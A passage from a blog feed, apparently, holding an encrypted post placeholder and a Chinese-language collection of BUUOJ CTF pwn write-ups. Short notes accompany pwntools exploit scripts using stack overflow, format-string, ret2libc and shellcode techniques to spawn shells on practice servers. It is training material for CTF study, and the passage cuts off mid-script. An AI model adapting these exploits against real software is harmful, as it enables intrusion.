e770dbe73ec2062d75521d983d1d89bd15150fc6f1bc4c82842e24b2fb1382656e452c1fcd7eacec7f01010156afad058e81bc3d41e918f12adb57924e89945cbd6ec3989e3bd348d9284b00ece29b7e5e402ea1af9e3bed7ccf262e5eb6067b25010ce4373123a77677fe691c0c2b172397d35de244e53633d7bf8bd7e27c6d5e40a049363545d9251d674cb4cfb12f28085dfc6df795d9617b6c18f69f2a60a9220c3aaf20d44e87ff61d005e24e3387d4d05717b94dc79cf39dc37762b43c6f84a3020fa47dbefa0c873abd10ccf47614b57a34ced0bbc0316a8d2b28af5afc603cb2690ad34ef091c5adae1f2c1d5bad345fdf4e715e9c5355c33795fbea821236b585cfcd392ecdbdae210b4c5d1690942fdc5d5d0d5d7e2cef958a554cfb661ccdd5e45fb812b9cf2c0b18053dd1c059e63220d6338e34aa496b281725c13e83d0c119f8bd4ad22b6f085388caec444ad835bf9d8df153a59509e2e7ea7ac463875a668f0368d0ed135c42e334f0bd2136387c9867e2e9fb7c867adbab64042fae838a00bb4b4ac46f39c6b0b15bcb4c27bc81d26277214ce8ce5d008e914b30461e48485cf441fe055a8c1b5fe9131f4577ddb0bfeafcb485e4577010cf284f29ad0b51ebf6b096fdcf30cf1f3e11dc8884f4adcde8ef5ff18c5b532ca2610b88dfac2c34c3672e9a988f2edb363035e188dbb2239196c701130fc69c9c7fec32eca4b652c9d688aefb00af017d6cb0e99982a19d13dcfeec1354232865e2507e350a741d8964a1e7346bfe9061a05fbc87962af9d355bb166f4e1b9a643a5c21b1eb70e29d841839c2fdaffef35e13e85ed576c01edc1df86013cee94cba781015ca5427d00d8d7aab4a38e249ccfbc85f74aabbe18ce6d37e6492f1809ead36e660919085099b5ab5e5e6f2eb0049b1a5c8d00d6ecaa806328b04ff7c91ff7fc742a74b9e34caf7b2ad6ff926488bbf48e9ac8d2aa909ac8cbfe10874f1befe6705c471643269e48e33c5693aa2c1b62ba381b6e595ef706e5952b1b9006d3b9d4d8d277a2841abf8cd178bc523a6bccc8aa362dbf719837cdd544846fb78986fbef37a109d453437736313dd61c1cd735c26fc16b56e072ee5efe42efcb5f70963dea5b42ab743e1c1c9cd341bf528999d02e55b77533146148a3f52ae4db67160456fa90d58af7da1fd932e14541dac2feb754e66ad21ede3bd1ebbbadc24d07782c1c1a24a6fe746502bc5e2470c2143d880ae91ebebe772604c0bad6a5759230cdbb9a81fbd789f76b6172c6f1a92210d3cec3b0503d4ab50c2a37469f7e635d12e7d14914ee5b0c4673f44f31b3fbf6347080db41df71962b7b8d97090399a4ec6fa7c978dac3a150272f3e1520d2326f389e681235c4f68f791e37ee25368d99b28158a71ee5d4da53fc4069647f421a1ab002acdae72f0031a88df788fdfc3eb55d80138315fab8455995986413365328225d3ab54b4bfdb08b44aaaaa280738b7c8608ffd29a34e1097c6eac62b4e27d2fe52ae7b6e0f17d13be3e2cc3bf632326a1df15e6c9d9465cf6b234595afb4daca1ac07a6df373aaa2a60b12114b5cd1acc696635671e5d0adb212a5c99b2999e9348925b123d64a03e529c529db86d0490537667eae340d95950dead6351fa7fc328dd3fd686cf6053bf1a9bddb818cdb81358b5aad9c4f344de9ed6ad3e9ac90a8ff8b5225ab09c8c90abc8a445f6a756946f493bd1ddddb4290913456eec326f7450871d3bb70dc570811b44c2fdf76d7bc508090e8ea3e2ce37ff3b61cdd407fad71481ef2431ee009d61c475dd6cffb77c51b9d91f45c7c8eb88d17a1f211d01afb2b4540191fe87207eccc1074b06fb728d3f0162dc9bf4a41ae328b60fb2a534fc761c3bed938e332ff7350d96b6fc21cf858fc46565dd39b5b46a1043297815855339091df0cb48b6b854878372da1b75cbed791d5a4bcb939f615675501e1368a10ffdff6d9ee77b9e180d82c4818fdd28be2f7bcee355e61220cebafc4fa65e3b838df1afe8ca076136d45f9d6ddf44c5d303a9bbb478111ba9d69ec7f50255895a0fc1b2a18352bb49df10e5a90d579fe5cdc463246c5f6367018385e05881adcfb70d281c53ce1e7813d67cef6245fff9f1ef062ae9d2ffc66ae627d8ce4493ac879fb8fe7a5ba69c9d836504860908153815e471784c78d1aff8de2ae4625f1ca1ca234e2acecd80d7d30911c691d3f6bbea37f7a38083aa209b28e3065d0a7f2792223b8e074157741d63deebf0da8bbabcfb17de5a25d728001522d4cdfea6f89e70dbb6ddd82092debdd1ef7a7d2a724f73b4c8f538300298b9831258831fb04bf02c227538448c6d6b49b6fdba91b3161e735a88b4076fa77ac9d5d0ec4c34de3f348beffc3c5a8133e70bac4fa2276e11a88cd6027ae2b5390944ea9ee6f6699f87f4f30ba14af256f5a07476129a8e23ee6d47601ba08e53ff2b002d226f6c98e37e52758a6e6a457d275e6e3f3b5f6519ef9422dd7634f8fb95eb97e9f3faf29283e76e970e92197492e84e1cecb64ca1ef33f4e61eb8104095a36bc3774a9b15ddf1e00646062194dc59dd33d50d5096786462a17b6e9842fa7331669eeef94721b333bd9ccdbb8b5f1dc4dc2165d55b6dece6744f2b6d1b2e37cd1f23c910285718fc5960498a9813d1feec8d6e15ba6bdf37e0556ab990471506dd17b9694789f8f34239169e5aaa1d1c119ef6b8c28bc81e4c6a833f950d9df2e78d8614093bc3a2a50ebbebb610bef69b443c1b9bf72e3d3ca7057ebce1eafbe93df9e78f9b43c9c9e954de8ed763b1b7b4323a5c50ae6317bab893dee371ecdf93f3a9de112558b90a58e57e22f63d7c9afaecc32745c687913d648fd306d595e2d48a013d888752b1afac745ab42b349a67b06aea667dd0c17741c17c05aa5c12cdcc381f4523cc666854fef3ab9b1500f855d29d67ccf29862df1e0d8af18d26a4f927ba108ffe8ccba47dc01c72f1a4340c4b8e112c82e90447a0ead974647739ad86407667742a9603929d6a50b0ab7b4e1dcc3ab0c26e0245230b69aea64244c346d75ba724a6a99aa30332732436b2feca7621282dd91f7e87d5531c4ec6514fe0a3aa43d569b7363c24450ff4df5b3ce1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">还没完成</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU刷题</title>
    <link href="/2020/11/24/buu%E5%88%B7%E9%A2%98/"/>
    <url>/2020/11/24/buu%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>因为真的花了大把时间去刷题，感谢carol师傅的贴心指导，好在过去记录了,一些话都是以前写的，放进来，未来不会再刷了，因为题目过时了，还有卷glibc也没什么用，早知道这点该多好(悲</p><p>还有一些不全的就不放了，也可能有重复，不过真的有人会看吗🤤</p><p>要找题目建议，浏览器CTRL+F，搜索题目</p><h2 id="大一上">大一上</h2><h3 id="第五空间2019-决赛-PWN5">[第五空间2019 决赛]PWN5</h3><p>利用格式化字符串漏洞和%n能改某地址改写数据</p><p>本题要改写的地址上的数据在.bss段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25657</span>)<br><br><span class="hljs-comment">#先跑遍程序找下偏移，例如送：aaaa,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</span><br><span class="hljs-comment">#找出formats在栈中的偏移</span><br>offest=<span class="hljs-number">10</span><br>dizhi=<span class="hljs-number">0x0804C044</span><br>r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,p32(dizhi)+<span class="hljs-string">&#x27;%10$n&#x27;</span>)<br><span class="hljs-comment">#地址在前，偏移指定位数，填a什么的改你要的值（好像只能大于等于4）</span><br>r.sendlineafter(<span class="hljs-string">&#x27;passwd&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-r2t3">[BJDCTF 2nd]r2t3</h3><p>#本题strlen,strcpy都用\x00检测末尾，不能用\x00绕过</p><p>#32位程序考虑整数溢出绕过，而且题目给了那么多空间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29897</span>)<br>shell=<span class="hljs-number">0x0804858b</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x11</span>)+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(shell)+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">260</span>-<span class="hljs-number">0x11</span>-<span class="hljs-number">8</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-en-2">ciscn_2019_en_2</h3><p>题目跟ciscn_2019_c_1重复了23333</p><h3 id="get-started-3dsctf-2016">get_started_3dsctf_2016</h3><p>这道题是栈溢出到指定函数。但要注意程序中有的是类似cat flag，不是开shell，直接溢出绕过if条件的话，程序错误退出flag不会显示</p><p>根据if条件，摆对两个参数，函数返回值跳到exit正常退出即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27426</span>)<br>catflag=<span class="hljs-number">0x080489a0</span><br>elf=ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>main=<span class="hljs-number">0x08048A20</span><br>exit=<span class="hljs-number">0x804e6a0</span><br>ret=<span class="hljs-number">0x08048196</span> <br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p32(ret)+p32(catflag)+p32(exit)+p32(<span class="hljs-number">0x308CD64F</span>)+p32(<span class="hljs-number">0x195719D1</span>)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>这程序静态链接，另一种解法是利用mprotect函数，通过给bss段赋可执行权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29970</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>mprotect = <span class="hljs-number">0x0806EC80</span><br>bss=<span class="hljs-number">0x080eb000</span><br>pop_ebx_esi_edi_ret=<span class="hljs-number">0x080509a5</span> <span class="hljs-comment"># pop ebx ; pop esi ; pop edi ; ret</span><br><br><span class="hljs-comment">#这里ebx==rdx好像</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p32(elf.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>])+p32(pop_ebx_esi_edi_ret)+p32(bss)+p32(<span class="hljs-number">0x2d</span>)+p32(<span class="hljs-number">7</span>)<br>payload+=p32(elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>])+p32(bss)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x2c</span>)<br><span class="hljs-comment">#这里是先给bss段开可读可写可执行，然后调用个输入函数，再送个shellcraft进去</span><br>r.sendline(payload)<br>pd=asm(shellcraft.sh())<br>r.sendline(pd)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-8">ciscn_2019_n_8</h3><p>这题输入值把var[13]变成17</p><p>搞不清楚什么时候用p32打包数字，什么时候直接str(数字)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29729</span>)<br>r.sendline(<span class="hljs-string">&#x27;aaaa&#x27;</span>*<span class="hljs-number">13</span>+p32(<span class="hljs-number">17</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="jarvisoj-level2：">jarvisoj_level2：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26947</span>)<br>system=<span class="hljs-number">0x8048320</span><br>binsh=<span class="hljs-number">0x804a024</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="not-the-same-3dsctf-2016">not_the_same_3dsctf_2016</h3><p>程序有cat flag的值到.bss段，跳至指定函数，返回时用输出函数打印flag，反回地址填exit函数，正常退出便会显示flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28327</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)<br>flag=<span class="hljs-number">0x080ECA2D</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2d</span>+p32(elf.sym[<span class="hljs-string">&#x27;get_secret&#x27;</span>])<br><br>payload+=p32(elf.sym[<span class="hljs-string">&#x27;printf&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;exit&#x27;</span>])+p32(flag)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>另一种解法就是用mprotect提权，写shellcode到.bss段，没试过</p><h3 id="bjdctf-2020-babystack">bjdctf_2020_babystack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28514</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>,<span class="hljs-string">&#x27;30&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x4006E6</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop">[HarekazeCTF2019]baby_rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28521</span>)<br>binsh=<span class="hljs-number">0x601048</span><br>pop_rdi=<span class="hljs-number">0x0400683</span><br>sys=<span class="hljs-number">0x400490</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_rdi)+p64(binsh)+p64(sys))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="jarvisoj-level2-x64">jarvisoj_level2_x64</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26124</span>)<br>binsh=<span class="hljs-number">0x600A90</span><br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>sys=<span class="hljs-number">0x4004C0</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi)+p64(binsh)+p64(sys))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-5">ciscn_2019_n_5</h3><p>#ida看gets是两个参数，但实际写入貌似是第一个参数</p><p>#没开nx，canary第一次写sh到bss，第二次栈溢出跳bss段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27640</span>)<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>sh=asm(shellcraft.sh())<br>r.sendline(sh)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x601080</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="铁人三项-第五赛区-2018-rop">铁人三项(第五赛区)_2018_rop</h3><p>#标准的ret2libc</p><p>#网上有用write写到bss，相对麻烦了点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27790</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./2018_rop&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>payload+=p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">4</span>)<br>r.sendline(payload)<br>true=u32(r.recv(<span class="hljs-number">4</span>))<br>base=true-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x17b8cf</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(<span class="hljs-number">0x08048323</span>)+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="bjdctf-2020-babyrop">bjdctf_2020_babyrop</h3><p>也是ret2libc</p><p>特别注意接受打印出来的真实地址时格式应该怎么接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29945</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x0000000000400733</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">&#x27;story!\n&#x27;</span>)<br>true=u64(r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>base=true-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x18cd57</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-s-3">ciscn_2019_s_3</h3><p>这题感觉好难= =</p><p>#用59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget-__libc_csu_init。</p><p>#前面部分都是一样的，后面改成rop去开shell</p><p>#r13的值会给到rdx；让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码；我们可以调到后面的rop执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27416</span>)<br>main=<span class="hljs-number">0x0004004ED</span><br>execv=<span class="hljs-number">0x04004E2</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br>pop_rbx_rbp_r12_r13_r14_r15=<span class="hljs-number">0x40059A</span><br>mov_rdxr13_call=<span class="hljs-number">0x0400580</span> <br>sys=<span class="hljs-number">0x00400517</span><br>pl1=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">8</span>+p64(main)<br>io.send(pl1)<br>io.recv(<span class="hljs-number">0x20</span>)<br>sh=u64(io.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">280</span><br>pl2=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">8</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="hljs-number">0</span>)\*<span class="hljs-number">2</span>+p64(sh+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>pl2+=p64(mov_rdxr13_call)+p64(execv)<br>pl2+=p64(pop_rdi)+p64(sh)+p64(sys)<br>io.send(pl2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="others-shellcode">others_shellcode</h3><p>直接nc连一下，cat flag就行</p><h3 id="HarekazeCTF2019-baby-rop2">[HarekazeCTF2019]baby_rop2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#这题就是用printf函数时，要有个形式参数%s，</span><br><br><span class="hljs-comment">#还有就是接收值的时候，接收的地址中间的某个字节为0，printf输出的就是不完整的地址，会导致错误</span><br><br><span class="hljs-comment">#剩下的就是标准ret2libc</span><br><br>pop_rdi=<span class="hljs-number">0x0000000000400733</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rsi_r15 = <span class="hljs-number">0x0000000000400731</span><br>format_str = <span class="hljs-number">0x0000000000400770</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])+p64(<span class="hljs-number">0</span>)+p64(elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>r.recvuntil(<span class="hljs-string">&#x27;name? &#x27;</span>)<br>r.sendline(payload)<br>true=u64(r.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(true)<br>binsh=<span class="hljs-number">0x18cd57</span><br>base=true-libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>pd2=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(binsh+base)+p64(system)<br>r.sendline(pd2)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>4.ez_pz_hackover_2016</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#这题直接告诉了栈的地址，还没开nx</span><br><br><span class="hljs-comment">#要找到输入的数据在栈中的偏移</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25044</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r.recvuntil(<span class="hljs-string">&#x27;crash: &#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">10</span>), <span class="hljs-number">16</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>payload = <span class="hljs-string">&#x27;crashme\x00&#x27;</span> <br>payload = payload.ljust(<span class="hljs-number">26</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>payload += p32(stack_addr-<span class="hljs-number">0x1C</span>)<br>payload += 